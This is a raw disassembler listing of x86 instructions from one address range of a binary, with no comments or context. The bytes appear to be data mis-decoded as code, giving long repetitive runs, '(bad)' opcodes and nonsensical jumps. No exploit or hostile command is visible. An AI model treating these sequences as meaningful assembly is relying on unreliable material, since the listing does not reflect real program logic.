  444e0f:	adc    ecx,DWORD PTR [edi+ebx*1]
  444e12:	dec    DWORD PTR [edi]
  444e14:	or     eax,0xe11ff2e
  444e19:	sbb    edi,edi
  444e1b:	push   ss
  444e1c:	adc    bh,BYTE PTR [ecx]
  444e1e:	call   DWORD PTR [eax]
  444e20:	push   cs
  444e21:	sub    edi,edi
  444e23:	push   ss
  444e24:	push   ss
  444e25:	xor    bh,bh
  444e27:	or     BYTE PTR [edx],bl
  444e29:	mov    ah,0xff
  444e2b:	add    BYTE PTR [edx],al
  444e2d:	fwait
  444e2e:	inc    DWORD PTR [eax]
  444e30:	add    BYTE PTR [eax-0x1],bl
  444e33:	add    BYTE PTR [eax],al
  444e35:	sub    edi,edi
  444e37:	add    BYTE PTR [eax],al
  444e39:	ud0    eax,DWORD PTR [eax]
  444e3c:	add    BYTE PTR [eax],al
  444e3e:	inc    DWORD PTR [eax]
  444e40:	add    BYTE PTR [eax],al
  444e42:	inc    DWORD PTR [eax]
  444e44:	add    BYTE PTR [eax],al
  444e46:	inc    DWORD PTR [eax]
  444e48:	add    BYTE PTR [eax],al
  444e4a:	inc    DWORD PTR [eax]
  444e4c:	add    BYTE PTR [eax],al
  444e4e:	inc    DWORD PTR [eax]
  444e50:	add    BYTE PTR [ecx],al
  444e52:	inc    DWORD PTR [eax]
  444e54:	add    BYTE PTR ds:0xd0000ff,al
  444e5a:	inc    DWORD PTR [eax]
  444e5c:	add    BYTE PTR [edi+edi*8],bl
  444e5f:	add    BYTE PTR [eax],al
  444e61:	cmp    bh,bh
  444e63:	add    BYTE PTR [eax],al
  444e65:	popa   
  444e66:	inc    DWORD PTR [eax]
  444e68:	add    BYTE PTR [ebx-0x1ef4ff01],dl
  444e6e:	inc    DWORD PTR [edi]
  444e70:	and    dl,al
  444e72:	dec    DWORD PTR [edx]
  444e74:	or     ah,BYTE PTR [edi]
  444e76:	call   DWORD PTR [ebx]
  444e78:	cmovne edi,edi
  444e7b:	adc    BYTE PTR ds:0xe0dff41,cl
  444e81:	cmp    bh,bh
  444e83:	or     al,BYTE PTR [edi]
  444e85:	and    al,0xff
  444e87:	add    al,0x6
  444e89:	dec    ecx
  444e8a:	inc    DWORD PTR [esi]
  444e8c:	bswap  edx
  444e8e:	dec    DWORD PTR ds:0x12ff6b12
  444e94:	adc    eax,0x1510ff21
  444e99:	inc    esp
  444e9a:	inc    DWORD PTR [edi]
  444e9c:	or     al,0x43
  444e9e:	call   DWORD PTR [ebx]
  444ea0:	adc    DWORD PTR [esi-0x1],eax
  444ea3:	adc    eax,0x13ff3d17
  444ea8:	adc    edi,DWORD PTR [esi]
  444eaa:	call   DWORD PTR [eax]
  444eac:	(bad)  
  444eae:	dec    DWORD PTR [edi]
  444eb0:	adc    DWORD PTR [ebx],esi
  444eb2:	dec    DWORD PTR [edi]
  444eb4:	adc    eax,0x1009ff3b
  444eb9:	aaa    
  444eba:	call   DWORD PTR [edx*1+0x1920ff3b]
  444ec1:	xor    al,0xff
  444ec3:	and    BYTE PTR [ecx],bl
  444ec5:	xor    bh,bh
  444ec7:	push   ss
  444ec8:	adc    dh,BYTE PTR [ecx]
  444eca:	call   FWORD PTR [esi]
  444ecc:	sbb    al,0x40
  444ece:	call   FWORD PTR [esi]
  444ed0:	sbb    eax,DWORD PTR [ecx-0x1]
  444ed3:	add    al,0x3
  444ed5:	and    eax,0x371818ff
  444eda:	call   FWORD PTR [edx]
  444edc:	pop    ss
  444edd:	xor    bh,bh
  444edf:	sbb    DWORD PTR [edi],edx
  444ee1:	xor    bh,bh
  444ee3:	sub    BYTE PTR ds:0x2b2cff3b,ah
  444ee9:	aas    
  444eea:	call   FWORD PTR [edi]
  444eec:	and    edi,DWORD PTR [edi]
  444eee:	call   FWORD PTR [edi]
  444ef0:	sub    dh,BYTE PTR [eax-0x1]
  444ef3:	sbb    al,0x21
  444ef5:	pop    ecx
  444ef6:	dec    DWORD PTR [esp+edx*1]
  444ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444efa:	inc    DWORD PTR [eax]
  444efc:	add    ch,dl
  444efe:	inc    DWORD PTR [edx]
  444f00:	or     esi,ebx
  444f02:	inc    DWORD PTR [edx]
  444f04:	adc    ah,dl
  444f06:	inc    DWORD PTR [ecx]
  444f08:	add    cl,BYTE PTR [edi+edi*8-0x8d0000]
  444f0f:	add    BYTE PTR [eax],al
  444f11:	dec    ecx
  444f12:	inc    DWORD PTR [eax]
  444f14:	add    BYTE PTR [ecx],ch
  444f16:	inc    DWORD PTR [eax]
  444f18:	add    BYTE PTR [edi+edi*8],dl
  444f1b:	add    BYTE PTR [eax],al
  444f1d:	pop    es
  444f1e:	inc    DWORD PTR [eax]
  444f20:	add    BYTE PTR [ecx],al
  444f22:	inc    DWORD PTR [eax]
  444f24:	add    BYTE PTR [eax],al
  444f26:	inc    DWORD PTR [eax]
  444f28:	add    BYTE PTR [eax],al
  444f2a:	inc    DWORD PTR [eax]
  444f2c:	add    BYTE PTR [eax],al
  444f2e:	inc    DWORD PTR [eax]
  444f30:	add    BYTE PTR [eax],al
  444f32:	inc    DWORD PTR [eax]
  444f34:	add    BYTE PTR [eax],al
  444f36:	inc    DWORD PTR [eax]
  444f38:	add    BYTE PTR [eax],al
  444f3a:	inc    DWORD PTR [eax]
  444f3c:	add    BYTE PTR [eax],al
  444f3e:	inc    DWORD PTR [eax]
  444f40:	add    BYTE PTR [eax],al
  444f42:	inc    DWORD PTR [eax]
  444f44:	add    BYTE PTR [eax],al
  444f46:	inc    DWORD PTR [eax]
  444f48:	add    BYTE PTR [eax],al
  444f4a:	inc    DWORD PTR [eax]
  444f4c:	add    BYTE PTR [eax],al
  444f4e:	inc    DWORD PTR [eax]
  444f50:	add    BYTE PTR [eax],al
  444f52:	inc    DWORD PTR [eax]
  444f54:	add    BYTE PTR [eax],al
  444f56:	inc    DWORD PTR [eax]
  444f58:	add    BYTE PTR [eax],al
  444f5a:	inc    DWORD PTR [eax]
  444f5c:	add    BYTE PTR [eax],al
  444f5e:	inc    DWORD PTR [eax]
  444f60:	add    BYTE PTR [eax],al
  444f62:	inc    DWORD PTR [eax]
  444f64:	add    BYTE PTR [ecx],al
  444f66:	inc    DWORD PTR [eax]
  444f68:	add    BYTE PTR [edi+edi*8],al
  444f6b:	add    BYTE PTR [eax],al
  444f6d:	or     bh,bh
  444f6f:	add    BYTE PTR [eax],al
  444f71:	push   ss
  444f72:	inc    DWORD PTR [eax]
  444f74:	add    BYTE PTR [edi+edi*8],ch
  444f77:	add    BYTE PTR [eax],al
  444f79:	dec    esp
  444f7a:	inc    DWORD PTR [eax]
  444f7c:	add    BYTE PTR [edi+edi*8+0x0],dh
  444f80:	add    BYTE PTR [eax-0x14f7ff01],ch
  444f86:	dec    DWORD PTR [edi+edx*1]
  444f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444f8a:	call   FWORD PTR [ebx]
  444f8c:	adc    esi,DWORD PTR [eax]
  444f8e:	jmp    FWORD PTR [eax]
  444f90:	and    eax,0x1318ff15
  444f95:	adc    edi,edi
  444f97:	add    BYTE PTR [eax],al
  444f99:	retf   
  444f9a:	inc    DWORD PTR [eax]
  444f9c:	add    cl,ah
  444f9e:	inc    DWORD PTR [esp+eax*1]
  444fa1:	ja     0x444fa2
  444fa3:	adc    BYTE PTR [eax],dl
  444fa5:	sub    edi,edi
  444fa7:	or     al,0xf
  444fa9:	xor    edi,edi
  444fab:	sbb    BYTE PTR [eax+ecx*2],bl
  444fae:	call   FWORD PTR [ecx]
  444fb0:	sbb    edi,DWORD PTR ds:0x361614ff
  444fb6:	jmp    DWORD PTR [eax]
  444fb8:	sbb    BYTE PTR [eax-0x1],cl
  444fbb:	or     eax,0xff8509
  444fc0:	add    BYTE PTR [ebp-0x42ffff01],dh
  444fc6:	dec    DWORD PTR [ebx]
  444fc8:	or     al,0x83
  444fca:	call   DWORD PTR [eax+ebx*1]
  444fcd:	sub    al,0xff
  444fcf:	push   cs
  444fd0:	push   cs
  444fd1:	xor    edi,edi
  444fd3:	or     DWORD PTR [eax],ecx
  444fd5:	sub    bh,bh
  444fd7:	ud2    
  444fd9:	call   DWORD PTR ss:[ecx]
  444fdc:	sbb    ah,BYTE PTR [edi+edi*8+0xd]
  444fe0:	adc    eax,0x1b16ff5c
  444fe5:	xor    al,0xff
  444fe7:	add    eax,0x2ffe215
  444fec:	or     dl,dl
  444fee:	dec    DWORD PTR [esi]
  444ff0:	push   cs
  444ff1:	sub    edi,edi
  444ff3:	adc    dl,BYTE PTR [ecx]
  444ff5:	xor    bh,bh
  444ff7:	push   ss
  444ff8:	sbb    BYTE PTR [ecx],bh
  444ffa:	call   FWORD PTR [ecx]
  444ffc:	adc    al,0x36
  444ffe:	call   DWORD PTR [edx+edx*1]
  445001:	pop    ds
  445002:	call   DWORD PTR ds:0xff331d
  445008:	add    edx,edx
  44500a:	dec    DWORD PTR [edx]
  44500c:	adc    BYTE PTR [edi+edi*8-0xe7e6eb],al
  445013:	push   cs
  445014:	or     al,0x33
  445016:	call   FWORD PTR [edx]
  445018:	pop    ss
  445019:	inc    esi
  44501a:	call   FWORD PTR [edx]
  44501c:	push   ss
  44501d:	notrack call DWORD PTR ds:0x17ff3815
  445024:	pop    ss
  445025:	sub    al,0xff
  445027:	pop    es
  445028:	sbb    BYTE PTR [ebp-0x64fdff01],ch
  44502e:	inc    DWORD PTR [eax]
  445030:	add    BYTE PTR [ebx-0x1],bl
  445033:	add    BYTE PTR [eax],al
  445035:	inc    DWORD PTR cs:[eax]
  445038:	add    BYTE PTR [eax],dl
  44503a:	inc    DWORD PTR [eax]
  44503c:	add    BYTE PTR [ecx],al
  44503e:	inc    DWORD PTR [eax]
  445040:	add    BYTE PTR [eax],al
  445042:	inc    DWORD PTR [eax]
  445044:	add    BYTE PTR [eax],al
  445046:	inc    DWORD PTR [eax]
  445048:	add    BYTE PTR [eax],al
  44504a:	inc    DWORD PTR [eax]
  44504c:	add    BYTE PTR [ecx],al
  44504e:	inc    DWORD PTR [eax]
  445050:	add    BYTE PTR ds:0xd0000ff,al
  445056:	inc    DWORD PTR [eax]
  445058:	add    BYTE PTR [edi+edi*8],bl
  44505b:	add    BYTE PTR [eax],al
  44505d:	xor    eax,0x5a0000ff
  445062:	inc    DWORD PTR [eax]
  445064:	add    BYTE PTR [eax-0x2affff01],cl
  44506a:	dec    DWORD PTR [ecx]
  44506c:	adc    eax,0x1f11ffef
  445071:	dec    ebp
  445072:	dec    DWORD PTR [esi]
  445074:	(bad)  
  445077:	adc    BYTE PTR [edi],cl
  445079:	push   eax
  44507a:	inc    DWORD PTR [edi]
  44507c:	or     ch,BYTE PTR [esi]
  44507e:	dec    DWORD PTR [eax]
  445080:	or     DWORD PTR [eax],ebp
  445082:	inc    DWORD PTR [eax+ecx*1]
  445085:	pop    edi
  445086:	inc    DWORD PTR ds:0xfffbb0c
  44508c:	adc    al,0x8e
  44508e:	call   FWORD PTR [ecx]
  445090:	sbb    ch,BYTE PTR [ebx]
  445092:	dec    DWORD PTR ds:0x6ff3c0f
  445098:	or     DWORD PTR [ecx-0x1],eax
  44509b:	pop    ss
  44509c:	adc    al,0x47
  44509e:	call   DWORD PTR ds:0x13ff3614
  4450a4:	adc    bh,BYTE PTR [ebx]
  4450a6:	call   DWORD PTR [edx]
  4450a8:	adc    BYTE PTR [edx],bh
  4450aa:	call   DWORD PTR [eax]
  4450ac:	adc    DWORD PTR [edi+edi*8],esi
  4450af:	or     eax,0xeff3713
  4450b4:	adc    eax,0x100cff3d
  4450b9:	cmp    edi,edi
  4450bb:	sbb    dl,BYTE PTR [esi]
  4450bd:	cmp    edi,edi
  4450bf:	and    bl,BYTE PTR [edi]
  4450c1:	xor    edi,edi
  4450c3:	sbb    BYTE PTR [ebx],dl
  4450c5:	call   DWORD PTR cs:[esp+edx*1]
  4450c9:	xor    edi,edi
  4450cb:	pop    ss
  4450cc:	pop    ss
  4450cd:	cmp    bh,bh
  4450cf:	sbb    eax,0xeff4a1b
  4450d4:	or     eax,0x1518ff32
  4450d9:	xor    eax,0x3d1f21ff
  4450de:	jmp    DWORD PTR ds:0x2bff4123
  4450e4:	das    
  4450e5:	dec    ebx
  4450e6:	jmp    DWORD PTR ds:0x24ff4229
  4450ec:	xor    BYTE PTR [ecx-0x1],bl
  4450ef:	es ss jno 0x4450f2
  4450f3:	es ss test bh,bh
  4450f7:	add    BYTE PTR [esi],cl
  4450f9:	(bad)  
  4450fa:	inc    DWORD PTR [eax]
  4450fc:	add    edi,edi
  4450fe:	inc    DWORD PTR [eax]
  445100:	push   es
  445101:	mov    bh,0xff
  445103:	add    BYTE PTR [eax],al
  445105:	nop
  445106:	inc    DWORD PTR [eax]
  445108:	add    BYTE PTR [edx-0x1],dh
  44510b:	add    BYTE PTR [eax],al
  44510d:	dec    esp
  44510e:	inc    DWORD PTR [eax]
  445110:	add    BYTE PTR [esi],ch
  445112:	inc    DWORD PTR [eax]
  445114:	add    BYTE PTR [ecx],bl
  445116:	inc    DWORD PTR [eax]
  445118:	add    BYTE PTR [ebx],cl
  44511a:	inc    DWORD PTR [eax]
  44511c:	add    BYTE PTR [edi+edi*8],al
  44511f:	add    BYTE PTR [eax],al
  445121:	add    edi,edi
  445123:	add    BYTE PTR [eax],al
  445125:	add    bh,bh
  445127:	add    BYTE PTR [eax],al
  445129:	add    bh,bh
  44512b:	add    BYTE PTR [eax],al
  44512d:	add    bh,bh
  44512f:	add    BYTE PTR [eax],al
  445131:	add    bh,bh
  445133:	add    BYTE PTR [eax],al
  445135:	add    bh,bh
  445137:	add    BYTE PTR [eax],al
  445139:	add    bh,bh
  44513b:	add    BYTE PTR [eax],al
  44513d:	add    bh,bh
  44513f:	add    BYTE PTR [eax],al
  445141:	add    bh,bh
  445143:	add    BYTE PTR [eax],al
  445145:	add    bh,bh
  445147:	add    BYTE PTR [eax],al
  445149:	add    bh,bh
  44514b:	add    BYTE PTR [eax],al
  44514d:	add    bh,bh
  44514f:	add    BYTE PTR [eax],al
  445151:	add    bh,bh
  445153:	add    BYTE PTR [eax],al
  445155:	add    bh,bh
  445157:	add    BYTE PTR [eax],al
  445159:	add    bh,bh
  44515b:	add    BYTE PTR [eax],al
  44515d:	add    bh,bh
  44515f:	add    BYTE PTR [eax],al
  445161:	add    bh,bh
  445163:	add    BYTE PTR [eax],al
  445165:	add    bh,bh
  445167:	add    BYTE PTR [eax],al
  445169:	add    edi,edi
  44516b:	add    BYTE PTR [eax],al
  44516d:	add    al,0xff
  44516f:	add    BYTE PTR [eax],al
  445171:	or     bh,bh
  445173:	add    BYTE PTR [eax],al
  445175:	push   ss
  445176:	inc    DWORD PTR [eax]
  445178:	add    BYTE PTR [edi+edi*8],ch
  44517b:	add    BYTE PTR [eax],al
  44517d:	dec    edx
  44517e:	inc    DWORD PTR [eax]
  445180:	add    BYTE PTR [ecx-0x1],dh
  445183:	add    BYTE PTR [eax],al
  445185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445186:	inc    DWORD PTR [eax]
  445188:	add    bl,ah
  44518a:	inc    DWORD PTR [eax]
  44518c:	add    bl,bl
  44518e:	call   FWORD PTR [eax]
  445190:	adc    ecx,DWORD PTR [edi+edi*8+0x16]
  445194:	adc    ch,BYTE PTR [ebx]
  445196:	dec    DWORD PTR [ebx]
  445198:	or     DWORD PTR [eax-0x72f6f501],ebx
  44519e:	dec    DWORD PTR [edi]
  4451a0:	or     eax,0xc0bff22
  4451a5:	sbb    bh,bh
  4451a7:	or     DWORD PTR [ecx],ecx
  4451a9:	pop    ss
  4451aa:	call   DWORD PTR [ebx]
  4451ac:	sbb    BYTE PTR [edx],bh
  4451ae:	call   FWORD PTR [ebx]
  4451b0:	sbb    eax,DWORD PTR [ebp-0x1]
  4451b3:	adc    al,0x17
  4451b5:	cmp    eax,0x511d26ff
  4451ba:	inc    DWORD PTR [esi]
  4451bc:	add    eax,0xff9b
  4451c1:	mov    esi,0xbe0000ff
  4451c6:	inc    DWORD PTR [edx]
  4451c8:	push   es
  4451c9:	mov    cl,0xff
  4451cb:	pop    es
  4451cc:	or     BYTE PTR [eax],cl
  4451ce:	dec    DWORD PTR [edi]
  4451d0:	getsec 
  4451d2:	call   DWORD PTR [edx+edx*1]
  4451d5:	inc    edx
  4451d6:	call   DWORD PTR [eax]
  4451d8:	(bad)  
  4451db:	or     al,0x10
  4451dd:	cmp    eax,0x48120dff
  4451e2:	call   DWORD PTR [ebx]
  4451e4:	pop    ss
  4451e5:	sub    eax,0xd51202ff
  4451ea:	inc    DWORD PTR [edx]
  4451ec:	pop    es
  4451ed:	ret    0xeff
  4451f0:	or     edi,DWORD PTR [edi]
  4451f2:	call   DWORD PTR [edx]
  4451f4:	adc    esi,DWORD PTR [edx]
  4451f6:	call   FWORD PTR [eax]
  4451f8:	adc    eax,0x1619ff3b
  4451fd:	cmp    eax,0x341112ff
  445202:	call   DWORD PTR [edi]
  445204:	pop    ds
  445205:	sub    eax,0xb20a04ff
  44520a:	inc    DWORD PTR [ebx]
  44520c:	add    al,0xdd
  44520e:	call   DWORD PTR [ebx]
  445210:	sbb    eax,0x1e1aff1f
  445215:	xor    eax,0x432024ff
  44521a:	call   DWORD PTR [edi]
  44521c:	adc    eax,0x1917ff3d
  445221:	dec    ecx
  445222:	call   DWORD PTR [edi]
  445224:	sbb    BYTE PTR [ecx],dh
  445226:	dec    DWORD PTR [ebx]
  445228:	push   ds
  445229:	(bad)  
  44522a:	inc    DWORD PTR [ecx]
  44522c:	add    bl,BYTE PTR [edi+0x5c0000ff]
  445232:	inc    DWORD PTR [eax]
  445234:	add    BYTE PTR [esi],ch
  445236:	inc    DWORD PTR [eax]
  445238:	add    BYTE PTR [eax],dl
  44523a:	inc    DWORD PTR [eax]
  44523c:	add    BYTE PTR [ecx],al
  44523e:	inc    DWORD PTR [eax]
  445240:	add    BYTE PTR [eax],al
  445242:	inc    DWORD PTR [eax]
  445244:	add    BYTE PTR [eax],al
  445246:	inc    DWORD PTR [eax]
  445248:	add    BYTE PTR [ecx],al
  44524a:	inc    DWORD PTR [eax]
  44524c:	add    BYTE PTR ds:0xd0000ff,al
  445252:	inc    DWORD PTR [eax]
  445254:	add    BYTE PTR ds:0x360000ff,bl
  44525a:	inc    DWORD PTR [eax]
  44525c:	add    BYTE PTR [eax-0x1],bl
  44525f:	add    BYTE PTR [eax],al
  445261:	test   bh,bh
  445263:	add    BYTE PTR [ebx],al
  445265:	mov    ebp,0xf20702ff
  44526a:	call   DWORD PTR ds:0x13ff6528
  445270:	and    BYTE PTR [eax-0x1],dl
  445273:	adc    DWORD PTR [edi],edx
  445275:	dec    WORD PTR ds:0xcff4c0e
  44527c:	push   cs
  44527d:	inc    ebx
  44527e:	dec    DWORD PTR [edx]
  445280:	or     BYTE PTR [ecx-0x1],bl
  445283:	or     cl,BYTE PTR [edi]
  445285:	(bad)  
  445286:	dec    DWORD PTR [esi]
  445288:	adc    al,0x7a
  44528a:	call   DWORD PTR [ecx]
  44528c:	adc    eax,0xc08ff32
  445291:	das    
  445292:	dec    DWORD PTR [eax]
  445294:	or     ecx,DWORD PTR [ebp-0x1]
  445297:	pop    ds
  445298:	sbb    bl,BYTE PTR [ebx-0x1]
  44529b:	and    eax,0x10ff4824
  4452a0:	adc    DWORD PTR [edi+edi*8],edi
  4452a3:	adc    BYTE PTR [esi],cl
  4452a5:	cmp    edi,edi
  4452a7:	adc    dl,BYTE PTR [esi]
  4452a9:	xor    al,0xff
  4452ab:	adc    dl,BYTE PTR [ebx]
  4452ad:	cmp    bh,bh
  4452af:	adc    DWORD PTR [ebx],edx
  4452b1:	xor    eax,0x341511ff
  4452b6:	call   DWORD PTR [ebx]
  4452b8:	adc    eax,DWORD PTR [ecx-0x1]
  4452bb:	and    eax,0x23ff4b20
  4452c0:	and    dl,BYTE PTR [edx-0x1]
  4452c3:	pop    ss
  4452c4:	adc    al,0x2e
  4452c6:	jmp    DWORD PTR [edi+ebx*1]
  4452c9:	inc    esi
  4452ca:	call   FWORD PTR [ecx]
  4452cc:	sbb    DWORD PTR [ecx-0x1],ecx
  4452cf:	sbb    eax,0x14ff3e1c
  4452d4:	adc    dh,BYTE PTR ds:0x2e1011ff
  4452da:	call   DWORD PTR [edi]
  4452dc:	adc    eax,0x272bff31
  4452e1:	inc    ebx
  4452e2:	jmp    FWORD PTR ds:0x28ff4b30
  4452e8:	xor    eax,0x3226ff68
  4452ed:	(bad)  
  4452ee:	jmp    FWORD PTR [edx]
  4452f0:	aaa    
  4452f1:	jnp    0x4452f2
  4452f3:	push   es
  4452f4:	sbb    edi,edi
  4452f6:	inc    DWORD PTR [eax]
  4452f8:	or     eax,0x1309fffe
  4452fd:	lods   al,BYTE PTR ds:[esi]
  4452fe:	inc    DWORD PTR [eax]
  445300:	add    BYTE PTR [ebp+0x680000ff],cl
  445306:	inc    DWORD PTR [eax]
  445308:	add    BYTE PTR [edi-0x1],al
  44530b:	add    BYTE PTR [eax],al
  44530d:	sub    al,0xff
  44530f:	add    BYTE PTR [eax],al
  445311:	sbb    edi,edi
  445313:	add    BYTE PTR [eax],al
  445315:	or     al,0xff
  445317:	add    BYTE PTR [eax],al
  445319:	add    eax,0x10000ff
  44531e:	inc    DWORD PTR [eax]
  445320:	add    BYTE PTR [eax],al
  445322:	inc    DWORD PTR [eax]
  445324:	add    BYTE PTR [eax],al
  445326:	inc    DWORD PTR [eax]
  445328:	add    BYTE PTR [eax],al
  44532a:	inc    DWORD PTR [eax]
  44532c:	add    BYTE PTR [eax],al
  44532e:	inc    DWORD PTR [eax]
  445330:	add    BYTE PTR [eax],al
  445332:	inc    DWORD PTR [eax]
  445334:	add    BYTE PTR [eax],al
  445336:	inc    DWORD PTR [eax]
  445338:	add    BYTE PTR [eax],al
  44533a:	inc    DWORD PTR [eax]
  44533c:	add    BYTE PTR [eax],al
  44533e:	inc    DWORD PTR [eax]
  445340:	add    BYTE PTR [eax],al
  445342:	inc    DWORD PTR [eax]
  445344:	add    BYTE PTR [eax],al
  445346:	inc    DWORD PTR [eax]
  445348:	add    BYTE PTR [eax],al
  44534a:	inc    DWORD PTR [eax]
  44534c:	add    BYTE PTR [eax],al
  44534e:	inc    DWORD PTR [eax]
  445350:	add    BYTE PTR [eax],al
  445352:	inc    DWORD PTR [eax]
  445354:	add    BYTE PTR [eax],al
  445356:	inc    DWORD PTR [eax]
  445358:	add    BYTE PTR [eax],al
  44535a:	inc    DWORD PTR [eax]
  44535c:	add    BYTE PTR [eax],al
  44535e:	inc    DWORD PTR [eax]
  445360:	add    BYTE PTR [eax],al
  445362:	inc    DWORD PTR [eax]
  445364:	add    BYTE PTR [eax],al
  445366:	inc    DWORD PTR [eax]
  445368:	add    BYTE PTR [eax],al
  44536a:	inc    DWORD PTR [eax]
  44536c:	add    BYTE PTR [ecx],al
  44536e:	inc    DWORD PTR [eax]
  445370:	add    BYTE PTR [edi+edi*8],al
  445373:	add    BYTE PTR [eax],al
  445375:	or     bh,bh
  445377:	add    BYTE PTR [eax],al
  445379:	push   ss
  44537a:	inc    DWORD PTR [eax]
  44537c:	add    BYTE PTR [ebx],ch
  44537e:	inc    DWORD PTR [eax]
  445380:	add    BYTE PTR [edi-0x1],al
  445383:	add    BYTE PTR [eax],al
  445385:	ins    BYTE PTR es:[edi],dx
  445386:	inc    DWORD PTR [eax]
  445388:	add    BYTE PTR [edi-0x1afaff01],dl
  44538e:	inc    DWORD PTR [eax]
  445390:	add    bl,bh
  445392:	inc    DWORD PTR [esi]
  445394:	sbb    edi,edi
  445396:	call   DWORD PTR [edx]
  445398:	and    al,0xbd
  44539a:	call   DWORD PTR [edx]
  44539c:	pop    ss
  44539d:	push   eax
  44539e:	dec    DWORD PTR [edx]
  4453a0:	or     ebx,DWORD PTR [ebx]
  4453a2:	call   DWORD PTR [edi]
  4453a4:	push   ss
  4453a5:	xor    al,0xff
  4453a7:	or     eax,0x11ff270a
  4453ac:	adc    dh,BYTE PTR ds:0x431b1aff
  4453b2:	call   DWORD PTR [ebx]
  4453b4:	adc    bh,BYTE PTR [eax]
  4453b6:	jmp    DWORD PTR [esi+ebx*1]
  4453b9:	push   edi
  4453ba:	dec    DWORD PTR [edi]
  4453bc:	or     ebx,DWORD PTR [edi+edi*8-0x440000]
  4453c3:	add    BYTE PTR [eax],al
  4453c5:	mov    ebx,0xe30000ff
  4453ca:	call   DWORD PTR [ecx]
  4453cc:	push   cs
  4453cd:	sbb    eax,0x2e1517ff
  4453d2:	call   DWORD PTR [edi]
  4453d4:	push   ss
  4453d5:	cmp    edi,edi
  4453d7:	adc    edx,DWORD PTR [ebx]
  4453d9:	dec    DWORD PTR ds:[ecx+edx*1]
  4453dd:	inc    eax
  4453de:	dec    DWORD PTR [ebx]
  4453e0:	adc    DWORD PTR [edx-0x1],ecx
  4453e3:	push   es
  4453e4:	or     BYTE PTR ds:0xd10f00ff,al
  4453ea:	inc    DWORD PTR [edx]
  4453ec:	pop    es
  4453ed:	mov    esi,0x580b0dff
  4453f2:	call   DWORD PTR [edx+edx*1]
  4453f5:	xor    edi,edi
  4453f7:	and    DWORD PTR [edi],ebx
  4453f9:	dec    esi
  4453fa:	jmp    DWORD PTR [eax+eiz*1]
  4453fd:	dec    eax
  4453fe:	dec    DWORD PTR [edx+ecx*1]
  445401:	sub    bh,bh
  445403:	pop    ss
  445404:	sbb    DWORD PTR [edi],edi
  445406:	dec    DWORD PTR ds:0xff4010
  44540c:	add    al,bl
  44540e:	call   DWORD PTR [edx]
  445410:	sbb    DWORD PTR [ebx-0x1],ebx
  445413:	sbb    DWORD PTR [esp+ebp*1],ebx
  445416:	jmp    DWORD PTR [ebx+eiz*1]
  445419:	inc    esp
  44541a:	call   FWORD PTR [ebx]
  44541c:	push   ds
  44541d:	dec    ecx
  44541e:	call   DWORD PTR [ecx+ebx*1]
  445421:	inc    esi
  445422:	call   FWORD PTR [edx]
  445424:	and    BYTE PTR [edx],dh
  445426:	dec    DWORD PTR [ebx]
  445428:	sbb    al,0xc2
  44542a:	inc    DWORD PTR [eax]
  44542c:	add    DWORD PTR [ecx+0x5c0000ff],esp
  445432:	inc    DWORD PTR [eax]
  445434:	add    BYTE PTR [esi],ch
  445436:	inc    DWORD PTR [eax]
  445438:	add    BYTE PTR [eax],dl
  44543a:	inc    DWORD PTR [eax]
  44543c:	add    BYTE PTR [ecx],al
  44543e:	inc    DWORD PTR [eax]
  445440:	add    BYTE PTR [eax],al
  445442:	inc    DWORD PTR [eax]
  445444:	add    BYTE PTR [ecx],al
  445446:	inc    DWORD PTR [eax]
  445448:	add    BYTE PTR ds:0xd0000ff,al
  44544e:	inc    DWORD PTR [eax]
  445450:	add    BYTE PTR ds:0x360000ff,bl
  445456:	inc    DWORD PTR [eax]
  445458:	add    BYTE PTR [ecx-0x1],bl
  44545b:	add    BYTE PTR [eax],al
  44545d:	test   bh,bh
  44545f:	add    BYTE PTR [ecx],cl
  445461:	mov    ebx,0xf81e03ff
  445466:	call   DWORD PTR [esi]
  445468:	and    ch,BYTE PTR [edx-0x1]
  44546b:	push   ss
  44546c:	and    cl,BYTE PTR [edx-0x1]
  44546f:	or     BYTE PTR [esi+edi*1],dl
  445472:	inc    DWORD PTR ds:0xeff290a
  445478:	push   cs
  445479:	cmp    edi,edi
  44547b:	adc    BYTE PTR [edx],dl
  44547d:	inc    WORD PTR [ebx]
  445480:	or     BYTE PTR [ebx+0x420e0aff],bl
  445486:	dec    DWORD PTR [ecx]
  445488:	or     DWORD PTR [ecx],ebx
  44548a:	inc    DWORD PTR ds:0x17ff3704
  445490:	sbb    ebp,DWORD PTR [eax-0x1]
  445493:	sub    esp,DWORD PTR [esi]
  445495:	ins    DWORD PTR es:[edi],dx
  445496:	jmp    DWORD PTR [edi+ebx*1]
  445499:	ja     0x44549a
  44549b:	adc    al,0x15
  44549d:	dec    ebp
  44549e:	call   DWORD PTR [ebx]
  4454a0:	adc    al,BYTE PTR [edx-0x1]
  4454a3:	unpcklps xmm7,XMMWORD PTR [ecx]
  4454a6:	call   DWORD PTR [eax]
  4454a8:	push   ss
  4454a9:	cmp    edi,edi
  4454ab:	sbb    bl,BYTE PTR [ebx]
  4454ad:	inc    edi
  4454ae:	call   DWORD PTR [esi+edx*1]
  4454b1:	aaa    
  4454b2:	dec    DWORD PTR [edi]
  4454b4:	adc    edi,DWORD PTR [edi]
  4454b6:	jmp    FWORD PTR [edx]
  4454b8:	and    edx,DWORD PTR [edi-0x1]
  4454bb:	xor    BYTE PTR [eax],ch
  4454bd:	inc    esi
  4454be:	dec    DWORD PTR [ecx+ecx*1]
  4454c1:	and    al,0xff
  4454c3:	and    ebx,DWORD PTR [esi]
  4454c5:	inc    edx
  4454c6:	call   FWORD PTR [edx+ebx*1]
  4454c9:	cmp    bh,bh
  4454cb:	sbb    al,0x18
  4454cd:	notrack jmp DWORD PTR [eax]
  4454d0:	sbb    eax,0x2823ff3e
  4454d5:	inc    edi
  4454d6:	call   DWORD PTR [edx]
  4454d8:	adc    eax,0x161aff2d
  4454dd:	daa    
  4454de:	jmp    DWORD PTR [edi]
  4454e0:	and    DWORD PTR [edx-0x1],ecx
  4454e3:	sub    DWORD PTR ds:0x322cff77,ebp
  4454e9:	pop    edi
  4454ea:	jmp    DWORD PTR [edx]
  4454ec:	das    
  4454ed:	lods   al,BYTE PTR ds:[esi]
  4454ee:	inc    DWORD PTR ds:0xfffe10
  4454f4:	add    ch,ah
  4454f6:	inc    DWORD PTR [edx]
  4454f8:	add    eax,0xff95
  4454fd:	jge    0x4454fe
  4454ff:	add    BYTE PTR [eax],al
  445501:	pop    ebx
  445502:	inc    DWORD PTR [eax]
